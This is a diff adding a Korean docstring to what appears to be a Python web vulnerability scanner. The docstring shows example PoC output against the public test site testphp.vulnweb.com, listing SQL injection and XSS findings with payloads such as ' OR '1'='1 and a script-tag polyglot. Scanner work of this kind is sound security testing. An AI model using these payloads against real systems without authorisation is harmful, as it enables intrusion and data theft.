@@ -1,3 +1,27 @@
+'''
+예시 PoC 실행 결과:
+[+] 스캔 결과 - http://testphp.vulnweb.com/listproducts.php?cat=
+
+[+] 공통 페이로드 결과
+취약점 유형: sql_injection
+신뢰도: 80.0%
+페이로드: '"<script>{{7*7}}</script><!--
+근거: SQL 에러 패턴 발견
+--------------------------------------------------
+취약점 유형: xss
+신뢰도: 70.0%
+페이로드: '"<script>{{7*7}}</script><!--
+근거: 페이로드가 응답에서 필터링되지 않음
+--------------------------------------------------
+
+[+] SQL Injection 분석 결과
+취약점 유형: sql_injection
+신뢰도: 100.0%
+페이로드: ' OR '1'='1
+근거: SQL 에러 패턴 발견
+--------------------------------------------------
+'''
+
 from dataclasses import dataclass
 from typing import Dict, List, Optional
 from enum import Enum
